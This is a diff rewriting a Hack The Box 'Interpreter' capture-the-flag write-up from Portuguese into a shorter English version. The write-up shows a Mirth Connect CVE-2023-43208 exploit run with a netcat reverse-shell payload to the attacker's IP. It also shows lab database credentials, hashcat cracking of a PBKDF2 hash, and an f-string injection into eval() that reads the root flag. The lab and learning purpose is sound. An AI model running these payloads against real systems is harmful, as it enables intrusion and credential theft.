@@ -1,362 +1,156 @@
-# Hack The Box — Interpreter
+## Summary
 
-![HTB](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)
-![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
-![OS](https://img.shields.io/badge/OS-Linux-orange)
-![Category](https://img.shields.io/badge/Category-Web%20%7C%20RCE%20%7C%20Credentials%20%7C%20Privilege%20Escalation-red)
+Interpreter is a Medium Linux machine running **Mirth Connect 4.4.0**,
+vulnerable to an unauthenticated RCE (CVE-2023-43208) that yields a shell as the
+`mirth` service user. Database credentials in `mirth.properties` give access to
+a local MariaDB, exposing a PBKDF2 hash for `sedric` that is cracked for SSH
+access. A root-owned Flask service uses `eval()` on an f-string template, and an
+**f-string injection** is used to read the **root** flag as root.
 
----
+## Machine Information
 
-# Informações da Máquina
+| Name | Difficulty | OS | Platform |
+| --- | --- | --- | --- |
+| Interpreter | Medium | Linux | Hack The Box |
 
-| Nome | Dificuldade | Plataforma | OS |
-| ---- | ----------- | ---------- | -- |
-| Interpreter | Medium | Hack The Box | Linux |
+## Attack Path
 
----
+1. Nmap reveals SSH and Mirth Connect on HTTP/HTTPS.
+2. The version is confirmed as Mirth Connect 4.4.0.
+3. Unauthenticated RCE is exploited (CVE-2023-43208).
+4. A reverse shell is obtained as `mirth`.
+5. Config files reveal local database credentials.
+6. The MariaDB yields a PBKDF2 hash for `sedric`.
+7. The hash is cracked and reused for SSH access.
+8. A root-owned Flask service uses `eval()` on user input.
+9. F-string injection reads the root flag.
 
-# Superfície de ataque
+## Reconnaissance
 
-1. Enumeração inicial com Nmap  
-2. Identificação do Mirth Connect Administrator  
-3. Verificação da versão vulnerável Mirth Connect 4.4.0  
-4. Exploração de RCE não autenticado via CVE-2023-43208  
-5. Reverse shell como usuário `mirth`  
-6. Enumeração local e descoberta de credenciais em configuração  
-7. Acesso ao MariaDB local  
-8. Extração de hash do usuário `sedric`  
-9. Crack de hash PBKDF2-HMAC-SHA256 com Hashcat  
-10. Acesso via SSH como `sedric`  
-11. Enumeração de processo Python rodando como root  
-12. Exploração de `eval()` inseguro em serviço Flask local  
-13. Leitura da flag de root  
+Initial enumeration was performed with **Nmap**.
 
----
-
-# Reconhecimento
-
-A enumeração inicial foi feita com Nmap para identificar portas abertas, versões dos serviços e possíveis vetores de ataque.
-
-```
+```bash
 nmap -sC -sV -A -T4 10.129.244.184
 ```
 
-![Nmap](screenshots/nmap.png)
+| Port | Service | Notes |
+| --- | --- | --- |
+| 22 | SSH | OpenSSH 9.2p1 (Debian) |
+| 80 | HTTP | Jetty — Mirth Connect Administrator |
+| 443 | HTTPS | Jetty — Mirth Connect |
 
-O scan revelou uma superfície externa relativamente pequena:
+The exposed **Mirth Connect Administrator** was the most promising vector.
 
-- **22/tcp — SSH**: OpenSSH 9.2p1 em Debian
-- **80/tcp — HTTP**: Jetty, com título `Mirth Connect Administrator`
-- **443/tcp — HTTPS**: Jetty, também associado ao Mirth Connect
+## Web Enumeration
 
-O ponto mais interessante foi a presença do **Mirth Connect Administrator** nas portas web. Como o SSH normalmente exige credenciais válidas, a exploração inicial provavelmente estaria na aplicação web.
+The application presented **Mirth Connect by NextGen Healthcare**, with a Mirth
+Connect Administrator and a web dashboard sign-in.
 
-Também foi observado que o método HTTP `TRACE` estava habilitado. Embora isso não tenha sido o vetor principal, é uma configuração insegura que reforça a necessidade de investigar melhor o serviço web.
+## Exploitation — Mirth Connect RCE (CVE-2023-43208)
 
----
+A detection script confirmed the version and vulnerability:
 
-# Enumeração Web
-
-Ao acessar a aplicação pelo navegador, foi exibida a interface do **Mirth Connect by NextGen Healthcare**.
-
-```
-http://10.129.244.184
-```
-
-![Web](screenshots/web.png)
-
-A página apresentava duas áreas principais:
-
-- **Mirth Connect Administrator**
-- **Web Dashboard Sign in**
-
-Esse tipo de painel administrativo exposto é um alvo importante durante a enumeração, principalmente quando a tecnologia e a versão podem ser identificadas.
-
----
-
-# Identificação da Versão e Validação da Vulnerabilidade
-
-Após identificar que o serviço era Mirth Connect, o próximo passo foi validar a versão e procurar vulnerabilidades públicas associadas.
-
-Foi utilizado um script de detecção para confirmar se a instância estava vulnerável ao **CVE-2023-43208**.
-
-```
+```bash
 python3 detection.py https://10.129.244.184
 ```
-
-![Detection](screenshots/detection-rce.png)
-
-O script identificou:
 
 ```
 Server version: 4.4.0
 Vulnerable to CVE-2023-43208.
 ```
 
-Esse resultado foi decisivo: agora havia uma versão exata e uma vulnerabilidade compatível. A partir disso, o foco deixou de ser enumeração genérica e passou a ser exploração controlada do RCE.
+The public exploit was used to trigger a reverse shell:
 
----
-
-# Exploração — Remote Code Execution
-
-Com a vulnerabilidade confirmada, foi utilizado o exploit público para executar um comando no alvo.
-
-```
+```bash
 python3 CVE-2023-43208.py -u https://10.129.244.184 -c 'nc -c sh 10.10.14.228 4444'
 ```
 
-![Exploit](screenshots/exploit.png)
+A listener received the connection:
 
-A ideia aqui foi usar o RCE para iniciar uma conexão reversa para a máquina atacante. Antes de executar o payload, foi necessário deixar um listener ativo.
-
-```
+```bash
 nc -lvnp 4444
 ```
-
-![Reverse Shell](screenshots/rce.png)
-
-A conexão foi recebida com sucesso, e o comando `id` mostrou que a shell estava rodando como:
 
 ```
 uid=103(mirth) gid=111(mirth) groups=111(mirth)
 ```
 
-Isso confirmou acesso inicial como o usuário de serviço do Mirth Connect.
+## Initial Access (User)
 
----
-
-# Pós-Exploração — Credenciais do Banco
-
-Com acesso como `mirth`, o próximo passo foi procurar arquivos de configuração da aplicação. Serviços corporativos normalmente armazenam credenciais de banco em arquivos locais, e o Mirth Connect não foi exceção.
-
-No arquivo de configuração da aplicação ``/usr/local/mirthconnect/conf/mirth.properties``, foram encontradas credenciais em texto claro:
+As `mirth`, the application configuration exposed plaintext database
+credentials in `/usr/local/mirthconnect/conf/mirth.properties`:
 
 ```
 database.username = mirthdb
 database.password = MirthPass123!
 ```
 
-![Database Credentials](screenshots/db-credentials.png)
+These were used to access the local MariaDB:
 
-Esse achado indicava que havia um banco MariaDB/MySQL local acessível com essas credenciais. Como o usuário `mirth` roda a aplicação, fazia sentido que ele tivesse permissão para ler a configuração e se conectar ao banco.
-
----
-
-# Acesso ao MariaDB e Extração de Credenciais
-
-Com as credenciais encontradas, foi possível acessar o banco local.
-
-```
+```bash
 mysql -u mirthdb -p -h 127.0.0.1 mc_bdd_prod
-```
-
-Após autenticar com a senha encontrada, foram consultadas tabelas relacionadas a usuários e senhas.
-
-```
 select * from PERSON;
 select * from PERSON_PASSWORD;
 ```
 
-![Database](screenshots/db.png)
-
-A enumeração revelou o usuário:
-
-```
-sedric
-```
-
-E um hash associado:
+This revealed the user `sedric` and a Base64-encoded password hash:
 
 ```
 u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
 ```
 
-Nesse ponto, a hipótese era que essa senha pudesse ser reutilizada para acesso ao sistema via SSH. Porém, primeiro seria necessário identificar o formato do hash e quebrá-lo.
+## Privilege Escalation
 
----
+### Cracking the hash
 
-# Análise e Crack do Hash
+The hash was converted to a Hashcat-compatible **PBKDF2-HMAC-SHA256** format
+(600,000 iterations) and cracked:
 
-O valor extraído do banco estava codificado em Base64. Após análise, ele foi convertido para um formato compatível com Hashcat como **PBKDF2-HMAC-SHA256** com 600.000 iterações.
-
-Formato preparado:
-
-```
-sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
-```
-
-O modo utilizado no Hashcat foi o `10900`, correspondente a PBKDF2-HMAC-SHA256.
-
-```
+```bash
 hashcat -m 10900 sedric_hash.txt /usr/share/wordlists/rockyou.txt
 ```
-
-![Hashcat](screenshots/hashcat.png)
-
-O Hashcat recuperou a senha:
 
 ```
 snowflake1
 ```
 
-Esse foi um ponto importante da máquina: a exploração web forneceu uma shell de serviço, a shell permitiu ler configuração local, a configuração forneceu acesso ao banco, e o banco revelou uma credencial reutilizável.
+The password was reused for SSH (lateral movement to `sedric`):
 
----
-
-# Movimento Lateral — SSH como sedric
-
-Com a senha recuperada, foi testado login via SSH como `sedric`.
-
-```
+```bash
 ssh sedric@10.129.244.184
 ```
 
-![SSH](screenshots/ssh.png)
+The user flag lives at `/home/sedric/user.txt`.
 
-O login foi bem-sucedido, confirmando que:
+### Root-owned Flask service
 
-- `sedric` era um usuário válido do sistema
-- a senha quebrada era válida para SSH
-- havia reutilização de credencial entre aplicação e sistema operacional
+Enumeration found a Python process running as root:
 
-A partir daqui, o acesso ficou mais estável do que a reverse shell inicial.
-
----
-
-# Flag de Usuário
-
-Após autenticar como `sedric`, foi possível acessar o diretório home do usuário e ler a flag.
-
-```
-ls
-cat user.txt
-```
-
-![User Flag](screenshots/user-flag.png)
-
----
-
-# Enumeração para Escalação de Privilégio
-
-Com acesso como `sedric`, o próximo objetivo foi procurar processos, permissões ou serviços locais que pudessem ser explorados para obter root.
-
-Um dos comandos úteis nessa fase foi listar processos Python em execução:
-
-```
+```bash
 ps aux | grep python
+# /usr/bin/python3 /usr/local/bin/notif.py
 ```
 
-![Python Processes](screenshots/script-root.png)
+`notif.py` ran a local Flask server on `127.0.0.1:54321` with an `/addPatient`
+endpoint. It restricted remote access (`request.remote_addr != "127.0.0.1"`),
+but local access was available via the `sedric` shell. The critical flaw was in
+the template function:
 
-Entre os processos, um chamou atenção:
-
-```
-/usr/bin/python3 /usr/local/bin/notif.py
-```
-
-Esse processo estava rodando como **root**. Scripts customizados executando como root são sempre bons candidatos para análise, principalmente quando expõem serviços locais ou processam entrada controlada pelo usuário.
-
----
-
-# Análise do Script `notif.py`
-
-O conteúdo do script foi analisado com:
-
-```
-cat /usr/local/bin/notif.py
-```
-
-![Notif Script](screenshots/script.png)
-
-O script implementava um pequeno servidor Flask local, escutando em:
-
-```
-127.0.0.1:54321
-```
-
-O endpoint principal era:
-
-```
-/addPatient
-```
-
-O serviço recebia XML contendo dados de pacientes, processava os campos e gravava notificações em:
-
-```
-/var/secure-health/patients/
-```
-
-A primeira proteção relevante era a restrição por endereço remoto:
-
-```
-if request.remote_addr != "127.0.0.1":
-    abort(403)
-```
-
-Isso impedia acesso remoto direto. Porém, como já havia acesso SSH como `sedric`, era possível interagir com o serviço localmente.
-
-O ponto crítico estava na função `template()`:
-
-```
+```python
 template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
 return eval(f"f'''{template}'''")
 ```
 
-A aplicação tentava validar os campos com uma regex, mas a lista de caracteres permitidos incluía `{` e `}`. Isso é perigoso porque f-strings avaliam expressões Python dentro de chaves.
+The input validation allowed `{` and `}`, so an attacker-controlled field
+reaching the `eval()` could execute Python expressions as root.
 
-Em outras palavras: se um campo controlado pelo usuário chegasse até o `eval()` contendo `{expressao_python}`, essa expressão poderia ser executada no contexto do processo — que estava rodando como root.
+### F-string injection
 
----
+The `firstname` field was used to read the root flag:
 
-# Teste do Serviço Local
-
-Antes de explorar, foi feito um teste simples para entender o comportamento do endpoint.
-
-```
+```bash
 python3 - << 'EOF'
 import requests
-
-url = "http://127.0.0.1:54321/addPatient"
-xml = """<patient>
-<firstname>A</firstname>
-<lastname>B</lastname>
-<sender_app>X</sender_app>
-<timestamp>t</timestamp>
-<birth_date>01/01/2000</birth_date>
-<gender>M</gender>
-</patient>"""
-
-r = requests.post(url, data=xml)
-print(r.text)
-EOF
-```
-
-Resposta obtida:
-
-```
-Patient A B (M), 26 years old, received from X at t
-```
-
-Esse teste mostrou que:
-
-- o serviço estava ativo
-- o endpoint aceitava XML localmente
-- os campos enviados eram refletidos no template
-- a função de template estava sendo executada corretamente
-
-Com isso, a próxima etapa foi testar se a expressão dentro de `{}` seria avaliada.
-
----
-
-# Escalação de Privilégio — F-string Injection via `eval()`
-
-Como o campo `firstname` era inserido no template e posteriormente processado pelo `eval()`, foi enviado um payload para ler `/root/root.txt`.
-
-```
-python3 - << 'EOF'
-import requests
-
-url = "http://127.0.0.1:54321/addPatient"
 xml = """<patient>
 <firstname>{open("/root/root.txt").read()}</firstname>
 <lastname>B</lastname>
@@ -365,69 +159,46 @@ xml = """<patient>
 <birth_date>01/01/2000</birth_date>
 <gender>M</gender>
 </patient>"""
-
-r = requests.post(url, data=xml)
+r = requests.post("http://127.0.0.1:54321/addPatient", data=xml)
 print(r.text)
 EOF
 ```
 
-![Root Flag](screenshots/root-flag.png)
+The HTTP response returned the contents of `/root/root.txt`, confirming code
+execution as root.
 
-O resultado retornou a flag de root dentro da resposta HTTP.
+## Vulnerability Analysis
 
-Isso confirmou execução de código Python como root através de injeção em f-string avaliada por `eval()`.
+**Mirth Connect RCE (CVE-2023-43208)** — Mirth Connect 4.4.0 allowed
+unauthenticated remote command execution, giving the foothold as the `mirth`
+service user. Fix: upgrade Mirth Connect to a patched version.
 
----
+**Plaintext credentials in configuration** — `mirth.properties` stored database
+credentials in cleartext, exposing the local database and stored user hashes.
+Fix: encrypt configuration secrets and restrict file permissions.
 
-# Vulnerabilidades Identificadas
+**Credential reuse** — the cracked database password for `sedric` was also valid
+for SSH, enabling lateral movement to an interactive account. Fix: enforce
+unique credentials per service.
 
-### Mirth Connect RCE — CVE-2023-43208
+**Insecure `eval()` on user input (f-string injection)** — a root-owned Flask
+service evaluated a template with `eval()` and allowed `{}` in input, enabling
+Python code execution as root. Fix: never `eval()` user-controlled data; build
+output with safe string formatting and drop root privileges.
 
-A versão 4.4.0 do Mirth Connect permitiu execução remota de comandos sem autenticação, fornecendo acesso inicial como o usuário `mirth`.
-
-### Credenciais em texto claro
-
-O arquivo de configuração da aplicação continha credenciais de banco expostas em texto claro.
-
-### Reutilização de credenciais
-
-O hash recuperado no banco levou à senha do usuário `sedric`, que também era válida para SSH.
-
-### Serviço local inseguro rodando como root
-
-O script `/usr/local/bin/notif.py` executava como root e processava entrada controlada pelo usuário.
-
-### Uso inseguro de `eval()` com f-string
-
-A aplicação permitia caracteres `{}` na entrada e depois avaliava o template com `eval(f"f'''...'''")`, permitindo execução de expressões Python como root.
-
----
-
-# Ferramentas Utilizadas
+## Tools Used
 
 - Nmap
-- Python3
+- Python 3
 - Netcat
 - MariaDB/MySQL client
 - Hashcat
-- RockYou
 - SSH
 
----
+## Key Takeaways
 
-# Principais Aprendizados
-
-- Painéis administrativos expostos devem ser priorizados na enumeração.
-- Identificar versão exata pode transformar enumeração em exploração direta.
-- Credenciais em arquivos de configuração continuam sendo um vetor comum de pós-exploração.
-- Hashes em banco podem exigir conversão antes de serem usados no Hashcat.
-- Movimento lateral via SSH geralmente fornece uma shell mais estável do que uma reverse shell.
-- Processos customizados rodando como root devem ser analisados com atenção.
-- `eval()` com entrada controlada pelo usuário é extremamente perigoso, especialmente combinado com f-strings.
-- Restrições por localhost não impedem exploração quando o atacante já possui acesso local ao host.
-
----
-
-# Autor
-
-https://github.com/ninjaa-exe
+- Exposed admin panels should be prioritized; an exact version often turns enumeration into direct exploitation.
+- Credentials in config files remain a common post-exploitation vector.
+- Database hashes may need format conversion before cracking.
+- `eval()` on user-controlled input is extremely dangerous, especially with f-strings.
+- Localhost-only restrictions don't help once the attacker already has local access.
